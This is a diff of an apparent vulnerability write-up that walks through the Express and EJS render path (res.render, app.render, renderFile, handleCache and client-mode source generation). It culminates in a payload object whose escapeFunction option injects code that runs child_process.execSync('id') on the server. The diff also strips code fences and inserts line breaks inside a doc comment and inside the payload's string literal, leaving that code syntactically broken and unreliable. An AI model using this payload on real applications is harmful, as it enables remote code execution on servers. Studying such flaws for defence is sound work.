@@ -18,11 +18,6 @@ app.get('/', (req,res) => {
 app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
 })
-```
-
-
-
-```
 res.render = function render(view, options, callback) {
  var app = this.req.app;
  var done = callback;
@@ -48,11 +43,6 @@ res.render = function render(view, options, callback) {
  // render
  app.render(view, opts, done);
 };
-```
-
-
-
-```
 app.render = function render(name, options, callback) {
  var cache = this.cache;
  var done = callback;
@@ -116,11 +106,6 @@ app.render = function render(name, options, callback) {
  // render
  tryRender(view, renderOptions, done);
 };
-```
-
-
-
-```
 function tryRender(view, options, callback) {
  try {
  view.render(options, callback);
@@ -128,26 +113,17 @@ function tryRender(view, options, callback) {
  callback(err);
  }
 }
-```
-
-
-
-```
 /**
  * Express.js support.
  *
- * This is an alias for {@link module:ejs.renderFile}, in order to support
+ * This is an alias for {@link module:
+ejs.renderFile}, in order to support
  * Express.js out-of-the-box.
  *
  * @func
  */
 
 exports.__express = exports.renderFile;
-```
-
-
-
-```
 exports.renderFile = function () {
  var args = Array.prototype.slice.call(arguments);
  var filename = args.shift();
@@ -200,11 +176,6 @@ exports.renderFile = function () {
 
  return tryHandleCache(opts, data, cb);
 };
-```
-
-
-
-```
 if (data.settings) {
  // Pull a few things from known locations
  if (data.settings.views) {
@@ -220,11 +191,6 @@ if (data.settings) {
  utils.shallowCopy(opts, viewOpts);
  }
 }
-```
-
-
-
-```
 function handleCache(options, template) {
  var func;
  var filename = options.filename;
@@ -256,58 +222,29 @@ function handleCache(options, template) {
  }
  return func;
 }
-```
-
-
-
-```
 if (opts.client) {
  src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
  if (opts.compileDebug) {
  src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
  }
 }
-```
-
-
-
-```
 const payload = {
  settings: {
  'view options': {
  client: true,
- escapeFunction: '(() => {});return process.mainModule.require("child_process").execSync("id").toString()'
+ escapeFunction: '(() => {});
+return process.mainModule.require("child_process").execSync("id").toString()'
  }
  }
 }
-```
-
-
-
-```
 if (env === 'production') {
  this.enable('view cache');
 }
-```
-
-
-
-```
 // set .cache unless explicitly provided
 if (renderOptions.cache == null) {
  renderOptions.cache = this.enabled('view cache');
 }
-```
-
-
-
-```
 utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
-```
-
-
-
-```
 if (renderOptions.cache == null) {
  renderOptions.cache = this.enabled('view cache');
 }
